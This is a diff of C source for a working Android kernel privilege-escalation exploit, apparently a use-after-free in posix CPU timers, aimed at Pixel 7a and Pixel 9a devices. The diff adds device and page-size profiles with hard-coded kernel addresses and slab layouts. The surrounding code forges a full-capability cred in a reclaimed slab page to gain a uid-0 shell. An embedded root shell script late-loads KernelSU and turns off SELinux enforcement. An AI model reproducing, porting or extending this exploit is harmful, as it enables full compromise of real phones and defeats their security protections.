@@ -1,14 +1,16 @@
 /*
  * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
- * Target : Google Pixel 7a (lynx), Android 14
+ * Target : Google Pixel 7a (lynx) / Pixel 9a (tegu), Android 14/16
  * Kernel : 6.1.162-android14-11-g9dd05ae3a1de-ab16261587
  * SELinux: Enforcing
  * Patches: absent (android14-6.1-sp fix 88d31f5e5a98 landed 2026-10-15)
  * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
  *
  * Ported from the PLZ110 6.12.69 version.  The trigger mechanics are the
- * same; every build-dependent constant below comes from the lynx factory
- * vmlinux (kallsyms/BTF) and /proc/slabinfo on the running device.
+ * same; every build-dependent constant below comes from the factory
+ * vmlinux (kallsyms/BTF) and /proc/slabinfo on the running device.  The
+ * profile is selected at startup from the device property and page size,
+ * so one binary handles lynx and both tegu kernel variants.
  *
  * Two endgames:
  *
@@ -19,7 +21,7 @@
  *
  *   fake
  *     Point task->cred at a fake full-capability cred in the reclaimed
- *     order-1 page and disable SELinux.  The wait child must not call
+ *     slab page and disable SELinux.  The wait child must not call
  *     setuid() itself: task->cred is the fake cred while task->real_cred
  *     is still the original, and commit_creds() BUG_ONs on that mismatch.
  *     It forks instead; copy_creds() hands the worker a private cred with
@@ -27,7 +29,8 @@
  *     normalize uid/gid.  The worker then execs ksud late-load, which
  *     finds the installed KernelSU, KernelSU-Next or SukiSU Ultra
  *     libksud.so -- including repackaged managers with randomized
- *     package names -- and loads that manager's android14-6.1 module.
+ *     package names or renamed libraries -- and loads that manager's
+ *     android14-6.1 module.
  *     The parent parks with its socket buffers holding the fake cred page.
  *
  * The trigger leaves a stale timerqueue node; every failed plant parks
@@ -57,6 +60,8 @@
 #include <sys/prctl.h>
 #include <sys/resource.h>
 #include <sys/stat.h>
+#include <sys/utsname.h>
+#include <sys/system_properties.h>
 
 #define TR "/sys/kernel/tracing"
 #define CPU_TRIG 2
@@ -66,35 +71,97 @@
 #define VMA_COUNT 50000
 #define HELPER_STACK (1 << 20)
 #define LOCKERS 3
-#define PAGE 4096UL
-#define SOCKBUF 8192
 
-/* do_timer_create+0xa8 in the lynx 6.1.162 image (BTF/disasm).
- * posix_timers_cache: object_size 264 (0x108), order-1 slab, 31 per slab. */
-#define STATIC_TIMER_SITE 0xffffffc008192f7cULL
-#define TIMER_SITE_LOW21 0x192f7cULL
-#define TIMER_ALLOC 0x108ULL
+/*
+ * Build-dependent constants.  The Pixel 7a (lynx) and the Pixel 9a (tegu)
+ * factory boot images carry the same 6.1.162 4K-page kernel, so the 4K
+ * profile is shared.  Tegu also ships an optional 16K-page kernel
+ * (kernel_16k in its factory image); that image has different text/data
+ * addresses and an order-0 posix_timers_cache, so it gets its own profile.
+ */
+struct target_profile
+{
+    const char *name;
+    unsigned long page_size;
+    unsigned int page_shift;
+    unsigned int slab_order;
+    unsigned long slab_size;
+    unsigned long long static_timer_site;
+    unsigned long long timer_site_low21;
+    unsigned long long selinux_state_static;
+    unsigned long long panic_on_warn_static;
+    unsigned long long copy_process_low21;
+    unsigned long long root_user_static;
+    unsigned long long init_user_ns_static;
+    unsigned long long init_ucounts_static;
+    unsigned long long init_groups_static;
+    /* Plausible [min, max) range of the linear map on this VA layout. */
+    unsigned long long linear_min;
+    unsigned long long linear_max;
+};
+
+/* lynx 6.1.162, 4K pages (also used by tegu's stock boot.img).
+ * do_timer_create+0xa8; posix_timers_cache object_size 264 (0x108),
+ * order-1 slab, 31 objects. */
+static const struct target_profile profile_4k = {
+    "4k", 4096UL, 12, 1, 8192UL,
+    0xffffffc008192f7cULL, 0x192f7cULL,
+    0xffffffc00a25b448ULL, 0xffffffc00a00ac08ULL,
+    0xac068ULL,
+    0xffffffc00a0305c0ULL, 0xffffffc00a030330ULL,
+    0xffffffc00a031e48ULL, 0xffffffc00a0318e0ULL,
+    0xffffff0000000000ULL, 0xffffffc000000000ULL,
+};
+
+/* tegu kernel_16k, 16K pages.
+ * do_timer_create+0xa8 = 0xffffc00008193088; posix_timers_cache is
+ * order-0 (16K) with 62 objects, so the reclaim channel is 16 KiB too. */
+static const struct target_profile profile_16k = {
+    "16k", 16384UL, 14, 0, 16384UL,
+    0xffffc00008193088ULL, 0x193088ULL,
+    0xffffc0000a362458ULL, 0xffffc0000a0f0c08ULL,
+    0xabfd8ULL,
+    0xffffc0000a1195c0ULL, 0xffffc0000a119330ULL,
+    0xffffc0000a11ae48ULL, 0xffffc0000a11a8e0ULL,
+    0xffff000000000000ULL, 0xffffc00000000000ULL,
+};
+
+static const struct target_profile *g_tgt;
+static char g_device[128] = "unknown";
+static char g_kernel[256] = "unknown";
+
+#define PAGE (g_tgt->page_size)
+#define PAGE_SHIFT (g_tgt->page_shift)
+#define SLAB_ORDER (g_tgt->slab_order)
+#define SLAB_SIZE (g_tgt->slab_size)
+/* posix_timers_cache is order-1 (8K) on 4K pages, order-0 (16K) on 16K. */
+#define SLAB_MASK (~(unsigned long long)(SLAB_SIZE - 1))
+#define SLAB_OFF_MASK ((unsigned long long)(SLAB_SIZE - 1))
+#define LINEAR_MIN (g_tgt->linear_min)
+#define LINEAR_MAX (g_tgt->linear_max)
+#define SOCKBUF SLAB_SIZE
+#define STATIC_TIMER_SITE (g_tgt->static_timer_site)
+#define TIMER_SITE_LOW21 (g_tgt->timer_site_low21)
+#define SELINUX_STATE_STATIC (g_tgt->selinux_state_static)
+#define PANIC_ON_WARN_STATIC (g_tgt->panic_on_warn_static)
+#define COPY_PROCESS_LOW21 (g_tgt->copy_process_low21)
+#define ROOT_USER_STATIC (g_tgt->root_user_static)
+#define INIT_USER_NS_STATIC (g_tgt->init_user_ns_static)
+#define INIT_UCOUNTS_STATIC (g_tgt->init_ucounts_static)
+#define INIT_GROUPS_STATIC (g_tgt->init_groups_static)
 
 /* cred_jar: sizeof(struct cred) = 0xb0, kmem_cache size 0xc0. */
+#define TIMER_ALLOC 0x108ULL
 #define CRED_REQ 0xb0ULL
 #define CRED_ALLOC 0xc0ULL
 
-/* lynx 6.1.162 link-time addresses (kallsyms) and BTF field offsets. */
-#define SELINUX_STATE_STATIC 0xffffffc00a25b448ULL
-#define PANIC_ON_WARN_STATIC 0xffffffc00a00ac08ULL
 #define CRED_UID_OFF 0x4ULL
 
-/* task_struct / cred layout on lynx 6.1.162 (BTF). */
+/* task_struct / cred layout on 6.1.162 (BTF). */
 #define OFF_TASK_CRED 0x838ULL
-#define COPY_PROCESS_LOW21 0xac068ULL
 #define TASK_ALLOC_BYTES 0x12c0ULL
 #define FULLCAP 0x1ffffffffffULL
 
-/* Link-time symbols for the fake cred's refcounted sub-objects. */
-#define ROOT_USER_STATIC 0xffffffc00a0305c0ULL
-#define INIT_USER_NS_STATIC 0xffffffc00a030330ULL
-#define INIT_UCOUNTS_STATIC 0xffffffc00a031e48ULL
-#define INIT_GROUPS_STATIC 0xffffffc00a0318e0ULL
 /* SELinux is the only LSM using a cred blob here; fill 32 bytes to cover
  * blob offset 0 (this target) and 8 (other 6.1 LSM orderings). */
 #define SELINUX_BLOB_OFF 0x0ULL
@@ -297,7 +364,7 @@ static int is_kernel_ptr(unsigned long long v)
 }
 
 /*
- * Pair each timer slab with the order-1 page_alloc that created it.  The
+ * Pair each timer slab with the page_alloc that created it.  The
  * trace stream is in time order, so the page_alloc immediately preceding a
  * slab's first object is that slab's page.  This yields the victim pfn
  * without depending on a voted linear-map base.
@@ -317,7 +384,7 @@ static int pair_slab_pfn(const unsigned char *b, size_t n, int pid,
         {
             unsigned long long pfn = u64(b, i);
 
-            if (pfn < (1ULL << 26) && u32(b, i + 8) == 1)
+            if (pfn < (1ULL << 26) && u32(b, i + 8) == SLAB_ORDER)
             {
                 if (np == 64)
                     memmove(pend, pend + 1, 63 * sizeof(pend[0])), np--;
@@ -331,7 +398,7 @@ static int pair_slab_pfn(const unsigned char *b, size_t n, int pid,
         {
             unsigned long long ptr = u64(b, i + 8);
 
-            if (!is_kernel_ptr(ptr) || (ptr & ~0x1fffULL) != vslab)
+            if (!is_kernel_ptr(ptr) || (ptr & SLAB_MASK) != vslab)
                 continue;
             if (np > 0)
             {
@@ -439,7 +506,7 @@ static int scan_page_free(const unsigned char *b, size_t n,
 {
     for (size_t i = 16; i + 12 <= n; i += 4)
     {
-        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
+        if (u64(b, i) != pfn || (int)u32(b, i + 8) != (int)SLAB_ORDER)
             continue;
         if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
             return 1;
@@ -546,9 +613,9 @@ static int discover_page_types(unsigned char *raw)
 }
 
 /*
- * Vote the linear-map base from the target's timer slabs and same-PID order-1
- * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
- * roughly one vote per slab.
+ * Vote the linear-map base from the target's timer slabs and same-PID
+ * slab-order page_alloc pfns.  Partial-slab pairings are noise; the true
+ * base wins by roughly one vote per slab.
  */
 struct base_slot
 {
@@ -575,7 +642,7 @@ static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
     memset(tab, 0, sizeof(tab));
     for (int i = 0; i < nrec && ns < MAXS; i++)
     {
-        unsigned long long s = ptrs[i] & ~0x1fffULL;
+        unsigned long long s = ptrs[i] & SLAB_MASK;
         int dup = 0;
 
         for (int j = 0; j < ns; j++)
@@ -592,7 +659,7 @@ static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
         unsigned long long pfn = u64(b, i);
         int dup = 0;
 
-        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
+        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != (int)SLAB_ORDER ||
             u32(b, i - 4) != (unsigned)pid ||
             (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
             continue;
@@ -609,8 +676,8 @@ static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
     {
         for (int j = 0; j < np; j++)
         {
-            unsigned long long base = slabs[i] - (pfns[j] << 12);
-            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
+            unsigned long long base = slabs[i] - (pfns[j] << PAGE_SHIFT);
+            unsigned h = (unsigned)((base >> PAGE_SHIFT) * 2654435761u) &
                          (HSIZE - 1);
 
             for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
@@ -684,11 +751,11 @@ static unsigned long long calibrate_base(unsigned char *raw)
         }
         for (int i = 0; i < c; i++)
         {
-            unsigned long long slab = ptrs[i] & ~0x1fffULL;
+            unsigned long long slab = ptrs[i] & SLAB_MASK;
 
             for (int j = 0; j < rn; j++)
             {
-                unsigned long long base = slab - (recent[j] << 12);
+                unsigned long long base = slab - (recent[j] << PAGE_SHIFT);
                 int f = 0;
 
                 for (int k = 0; k < hc; k++)
@@ -938,7 +1005,7 @@ static void park_forever(const char *why)
 }
 
 /*
- * Stale timer node layout inside the reclaimed order-1 page.
+ * Stale timer node layout inside the reclaimed slab page.
  *   zero: parent=0 -> rb_erase writes 0 to target.
  *   fake: parent=node -> rb_erase writes node to target (task->cred); the
  *         fake cred fields are overlaid at the same offset by run_plant.
@@ -970,6 +1037,16 @@ static void write_ksu_script(void)
         "\"$d/lib/arm64-v8a/libksud.so\"; do\n"
         "    if [ -x \"$c\" ]; then echo \"$c\"; return 0; fi\n"
         "  done\n"
+        /* Repackagers may rename libksud.so.  ksud is a large executable
+         * and is the only native lib containing the late-load marker. */
+        "  [ -d \"$d/lib/arm64\" ] || return 1\n"
+        "  for c in $(find \"$d/lib/arm64\" -name '*.so' -size +2M "
+        "2>/dev/null); do\n"
+        "    [ -x \"$c\" ] || continue\n"
+        "    grep -aq 'late-load' \"$c\" 2>/dev/null || continue\n"
+        "    grep -aq 'uapi' \"$c\" 2>/dev/null || continue\n"
+        "    echo \"$c\"; return 0\n"
+        "  done\n"
         "  return 1\n"
         "}\n"
         "for p in $PKGS; do\n"
@@ -979,15 +1056,33 @@ static void write_ksu_script(void)
         "  c=$(lib_for \"$a\") && { KSUD=\"$c\"; PKG=\"$p\"; APK=\"$a\"; "
         "break; }\n"
         "done\n"
-        /* Repackaged managers (e.g. spoofed KernelSU-Next) can use any
-         * package name, and pm is not always usable from this context.
-         * As uid 0 we can read /data/app directly, so scan every libksud.so
-         * and derive the package from its install dir.  Prefer a manager
-         * installed for user 0 over one that only exists in another user. */
+        /* Repackaged managers (e.g. spoofed KernelSU-Next or SukiSU) can
+         * use any package name, and pm is not always usable from this
+         * context.  As uid 0 we can read /data/app directly, so scan for
+         * libksud.so and derive the package from its install dir.  Prefer
+         * a manager installed for user 0 over one in another user. */
         "if [ -z \"$KSUD\" ]; then\n"
         "  for c in $(find /data/app -name libksud.so 2>/dev/null | "
         "grep '/lib/arm64'); do\n"
         "    [ -x \"$c\" ] || continue\n"
+        "    d=$(dirname \"$(dirname \"$(dirname \"$c\")\")\")\n"
+        "    b=$(basename \"$d\"); p=${b%%-*}\n"
+        "    if [ -z \"$KSUD\" ]; then\n"
+        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"\n"
+        "    fi\n"
+        "    if [ -d \"/data/user/0/$p\" ] || "
+        "[ -d \"/data/user_de/0/$p\" ]; then\n"
+        "      KSUD=\"$c\"; PKG=\"$p\"; APK=\"$d/base.apk\"; break\n"
+        "    fi\n"
+        "  done\n"
+        "fi\n"
+        /* Same scan, but for repackagers that renamed the ksud library. */
+        "if [ -z \"$KSUD\" ]; then\n"
+        "  for c in $(find /data/app -path '*/lib/arm64/*.so' "
+        "-size +2M 2>/dev/null); do\n"
+        "    [ -x \"$c\" ] || continue\n"
+        "    grep -aq 'late-load' \"$c\" 2>/dev/null || continue\n"
+        "    grep -aq 'uapi' \"$c\" 2>/dev/null || continue\n"
         "    d=$(dirname \"$(dirname \"$(dirname \"$c\")\")\")\n"
         "    b=$(basename \"$d\"); p=${b%%-*}\n"
         "    if [ -z \"$KSUD\" ]; then\n"
@@ -1038,8 +1133,8 @@ static void write_ksu_script(void)
         "  echo KSU_MISSING\n"
         "  exit 1\n"
         "fi\n"
-        "echo \"[ksu] manager=$PKG ksud=$KSUD "
-        "version=$(\"$KSUD\" --version 2>&1 | head -n1)\"\n"
+        "KSUVER=$(\"$KSUD\" --version 2>&1 | head -n1)\n"
+        "echo \"[ksu] manager=$PKG ksud=$KSUD version=$KSUVER\"\n"
         "loaded() { grep -q '^kernelsu ' /proc/modules; }\n"
         "try_load() {\n"
         "  echo \"[ksu] late-load $*\"\n"
@@ -1049,8 +1144,14 @@ static void write_ksu_script(void)
         "  sleep 0.5\n"
         "  return 1\n"
         "}\n"
+        /* A module left over from an earlier run cannot be replaced by
+         * init_module (it fails with EEXIST).  Loading is pointless then,
+         * and a uapi mismatch is exactly what makes the manager report
+         * "not installed", so detect it and tell the user to reboot. */
+        "PRELOADED=0\n"
+        "loaded && PRELOADED=1\n"
         /* Fork CLIs differ; try the flags each one is most likely to know. */
-        "if ! loaded; then\n"
+        "if [ \"$PRELOADED\" = 0 ]; then\n"
         "  try_load --kmi \"$KMI\" --allow-shell --package-name \"$PKG\" || \\\n"
         "  try_load --kmi \"$KMI\" --package-name \"$PKG\" || \\\n"
         "  try_load --allow-shell --package-name \"$PKG\" || \\\n"
@@ -1063,7 +1164,27 @@ static void write_ksu_script(void)
         "  loaded && break\n"
         "  i=$((i+1)); sleep 0.1\n"
         "done\n"
-        "if loaded; then echo KSU_LOADED; else echo KSU_MISSING; fi\n"
+        "if loaded; then\n"
+        /* Compare the manager's own uapi with the loaded module's.  Newer
+         * ksud builds expose it via "debug info"; older ones leave it
+         * empty and we keep the old behaviour. */
+        "  want=$(echo \"$KSUVER\" | "
+        "sed -n 's/.*uapi: *\\([0-9][0-9]*\\).*/\\1/p')\n"
+        "  got=$(\"$KSUD\" debug info 2>/dev/null | "
+        "sed -n 's/^uapi_version: *\\([0-9][0-9]*\\).*/\\1/p')\n"
+        "  echo \"[ksu] uapi manager=${want:-?} kernel=${got:-?} "
+        "preloaded=$PRELOADED\"\n"
+        "  if [ -n \"$want\" ] && [ -n \"$got\" ] && "
+        "[ \"$want\" != \"$got\" ]; then\n"
+        "    echo \"[ksu] loaded module is incompatible (uapi $got, "
+        "manager needs $want); reboot, then run again\"\n"
+        "    echo KSU_STALE\n"
+        "  else\n"
+        "    echo KSU_LOADED\n"
+        "  fi\n"
+        "else\n"
+        "  echo KSU_MISSING\n"
+        "fi\n"
         "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
         "echo \"[ksu] enforce=$(getenforce)\"\n";
     int fd = open("/data/local/tmp/ksu_stage.sh",
@@ -1205,7 +1326,7 @@ static int scan_page_alloc_ours(const unsigned char *b, size_t n,
     {
         int pid;
 
-        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
+        if (u64(b, i) != pfn || (int)u32(b, i + 8) != (int)SLAB_ORDER)
             continue;
         if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
             continue;
@@ -1334,8 +1455,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
         if (!base)
             base = g_base;
-        if (!base || base < 0xffffff0000000000ULL ||
-            base > 0xffffffc000000000ULL)
+        if (!base || base < LINEAR_MIN || base > LINEAR_MAX)
         {
             trace_stop();
             kill(T, SIGKILL);
@@ -1346,14 +1466,14 @@ static void run_plant(unsigned long long target, int tag, int mode,
         }
         g_base = base;
         /*
-         * The linear map is [base, 0xffffffc000000000) on this VA layout;
+         * The linear map is [base, LINEAR_MAX) on this VA layout;
          * physical RAM is sparse and extends well past 16 GiB, so do not
          * bound by RAM size.  A pointer outside this window is a stale
          * kmem record or a mis-scanned site collision and must not shift
          * the victim index.
          */
         for (int i = 0; i < nrec; i++)
-            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
+            if (ptrs[i] >= base && ptrs[i] < LINEAR_MAX)
                 kept[nkeep++] = ptrs[i];
         logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
              tag, base, ns, np, nrec, nkeep);
@@ -1367,9 +1487,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
         return;
     }
     V = kept[VICTIM_IDX];
-    vslab = V & ~0x1fffULL;
+    vslab = V & SLAB_MASK;
     for (int i = 0; i < nkeep; i++)
-        if ((kept[i] & ~0x1fffULL) == vslab)
+        if ((kept[i] & SLAB_MASK) == vslab)
             slab_own++;
     /*
      * Prefer the positional slab/page pairing: it does not depend on the
@@ -1382,21 +1502,22 @@ static void run_plant(unsigned long long target, int tag, int mode,
         if (pair_slab_pfn(raw, (size_t)n, etid, vslab, &bpfn))
         {
             logf("[+] plant%d pair pfn=%#llx base_vote=%#llx pair_base=%#llx "
-                 "agree=%d\n", tag, bpfn, g_base, vslab - (bpfn << 12),
-                 (vslab - (bpfn << 12)) == g_base);
+                 "agree=%d\n", tag, bpfn, g_base,
+                 vslab - (bpfn << PAGE_SHIFT),
+                 (vslab - (bpfn << PAGE_SHIFT)) == g_base);
             pfn = bpfn;
         }
         else
         {
-            pfn = (V - g_base) >> 12;
+            pfn = (V - g_base) >> PAGE_SHIFT;
             logf("[+] plant%d pair missing; base pfn=%#llx\n", tag, pfn);
         }
     }
-    slab_pfn = pfn & ~1ULL;
+    slab_pfn = pfn & ~((1ULL << SLAB_ORDER) - 1);
     g_slide = site0 - STATIC_TIMER_SITE;
 
     {
-        size_t off = (size_t)((V & 0x1fff) + 0x78);
+        size_t off = (size_t)((V & SLAB_OFF_MASK) + 0x78);
 
         payload = malloc(SOCKBUF);
         if (!payload)
@@ -1407,15 +1528,17 @@ static void run_plant(unsigned long long target, int tag, int mode,
         }
         if (mode == 2)
         {
-            unsigned long long page = V & ~0x1fffULL;
+            unsigned long long page = V & SLAB_MASK;
             size_t cb = off + FAKE_CRED_OFF;   /* fake cred base */
             size_t p = cb;
             unsigned long long *c = (unsigned long long *)(payload + cb);
-            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
-                                       0x100, 0x0};
+            size_t blob = 0;
+            size_t cand[] = {SLAB_SIZE - 0x100, SLAB_SIZE / 2,
+                             SLAB_SIZE - SLAB_SIZE / 4, SLAB_SIZE / 4,
+                             0x100, 0x0};
             int fit = 0;
 
-            if (p + 0xb0 > 0x2000)
+            if (p + 0xb0 > SLAB_SIZE)
             {
                 logf("[-] plant%d fake cred spills p=%#zx; retryable\n",
                      tag, p);
@@ -1430,7 +1553,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
             {
                 size_t b = cand[i];
 
-                if (b + 0x40 > 0x2000)
+                if (b + 0x40 > SLAB_SIZE)
                     continue;
                 if (b + 0x40 <= off || cb + 0xb0 <= b)
                 {
@@ -1506,7 +1629,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         }
         slab_usage("pre-exec");
         logf("[+] plant%d mode=%s V=%#llx node=%#llx fake=%#llx target=%#llx "
-             "pfn=%#llx slab=%#llx slide=%#llx recs=%d slab_own=%d/32 "
+             "pfn=%#llx slab=%#llx slide=%#llx recs=%d slab_own=%d "
              "base=%#llx\n",
              tag, mode == 2 ? "fake" : "zero", V, V + 0x78,
              mode == 2 ? V + 0x78 + FAKE_CRED_OFF : 0, target,
@@ -1544,7 +1667,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     /*
      * Start phase 1 before releasing the target.  The victim slab is freed
      * inside the exec/exit path, so the spray must already be allocating
-     * order-1 pages when that happens; releasing it only after the zombie
+     * slab-order pages when that happens; releasing it only after the zombie
      * is observed leaves a window where the exec'd image or kernel
      * allocations split/take the page first, which permanently loses the
      * plant.  Phase 2 still starts when the free is seen in the trace.
@@ -1653,7 +1776,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     usleep(1000);
     logf("[+] plant%d reaping T=%d node=%#llx mode=%s payload_off=%#zx "
          "target=%#llx\n", tag, T, V + 0x78, mode == 2 ? "fake" : "zero",
-         (size_t)((V & 0x1fff) + 0x78), target);
+         (size_t)((V & SLAB_OFF_MASK) + 0x78), target);
     int st = 0;
     waitpid(T, &st, 0);
     logf("[+] plant%d reaped status=%#x\n", tag, st);
@@ -1723,7 +1846,7 @@ static void run_probe(unsigned char *raw)
                                              &slab_own, &slab_own);
 
         for (int i = 0; i < nrec; i++)
-            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
+            if (ptrs[i] >= base && ptrs[i] < LINEAR_MAX)
                 kept[nkeep++] = ptrs[i];
         logf("[probe] recs=%d site=%#llx slide=%#llx base=%#llx kept=%d\n",
              nrec, site0, site0 - STATIC_TIMER_SITE, base, nkeep);
@@ -1732,7 +1855,7 @@ static void run_probe(unsigned char *raw)
 
             for (int i = 0; i < nkeep; i++)
             {
-                unsigned long long o = kept[i] & 0x1fffULL;
+                unsigned long long o = kept[i] & SLAB_OFF_MASK;
 
                 if (o % 264 == 0)
                     a264++;
@@ -1747,15 +1870,15 @@ static void run_probe(unsigned char *raw)
         if (nkeep > VICTIM_IDX)
         {
             V = kept[VICTIM_IDX];
-            vslab = V & ~0x1fffULL;
+            vslab = V & SLAB_MASK;
             logf("[probe] V=%#llx off=%#llx node_off=%#llx fake=%#llx "
-                 "mod264=%llu mod256=%llu\n", V, V & 0x1fff,
-                 (V & 0x1fff) + 0x78, (V & 0x1fff) + 0x90,
-                 (V & 0x1fff) % 264, (V & 0x1fff) % 256);
+                 "mod264=%llu mod256=%llu\n", V, V & SLAB_OFF_MASK,
+                 (V & SLAB_OFF_MASK) + 0x78, (V & SLAB_OFF_MASK) + 0x90,
+                 (V & SLAB_OFF_MASK) % 264, (V & SLAB_OFF_MASK) % 256);
             if (pair_slab_pfn(raw, (size_t)n, etid, vslab, &pfn))
                 logf("[probe] pair pfn=%#llx pair_base=%#llx agree=%d\n",
-                     pfn, vslab - (pfn << 12),
-                     (vslab - (pfn << 12)) == base);
+                     pfn, vslab - (pfn << PAGE_SHIFT),
+                     (vslab - (pfn << PAGE_SHIFT)) == base);
             else
                 logf("[probe] pair missing\n");
         }
@@ -2038,6 +2161,35 @@ static int wait_child_main(const char *mode)
     _exit(5);
 }
 
+/*
+ * Pick the build profile from the running device.  The stock Pixel 7a
+ * (lynx) and Pixel 9a (tegu) boot images both use the same 6.1.162 4K
+ * kernel, so they share profile_4k.  Tegu also ships a 16K-page kernel
+ * in its factory image; the userspace page size is the reliable way to
+ * tell which one actually booted.
+ */
+static void detect_target(void)
+{
+    struct utsname u;
+    char dev[PROP_VALUE_MAX];
+    long ps;
+
+    g_tgt = &profile_4k;
+    if (uname(&u) == 0)
+        snprintf(g_kernel, sizeof(g_kernel), "%s", u.release);
+
+    dev[0] = '\0';
+    if (__system_property_get("ro.product.device", dev) > 0 && dev[0])
+        snprintf(g_device, sizeof(g_device), "%s", dev);
+
+    ps = sysconf(_SC_PAGESIZE);
+    if (ps == 16384)
+        g_tgt = &profile_16k;
+
+    logf("[+] device=%s kernel=%s pagesize=%ld profile=%s\n",
+         g_device, g_kernel, ps, g_tgt->name);
+}
+
 int main(int argc, char **argv)
 {
     unsigned char *raw;
@@ -2051,11 +2203,16 @@ int main(int argc, char **argv)
          argc > 1 && argv[1] ? argv[1] : "(none)");
     if (argc > 1 && !strcmp(argv[1], "wait"))
         return wait_child_main(argc > 2 ? argv[2] : "verify");
-    /* Lets the app confirm a downloaded binary targets this exact build. */
+
+    detect_target();
+    /* Lets the app confirm a downloaded binary targets this exact build.
+     * Keep target=lynx for the app's existing check; device picks the
+     * actual profile (Pixel 7a or Pixel 9a, 4K or 16K kernel). */
     if (argc > 1 && !strcmp(argv[1], "target"))
     {
-        printf("target=lynx\nkernel=6.1.162-android14-11-g9dd05ae3a1de-ab16261587\n"
-               "timer_site=%#llx\n",
+        printf("target=lynx\ndevice=%s\nkernel=%s\npagesize=%lu\n"
+               "profile=%s\ntimer_site=%#llx\n",
+               g_device, g_kernel, (unsigned long)PAGE, g_tgt->name,
                (unsigned long long)STATIC_TIMER_SITE);
         return 0;
     }
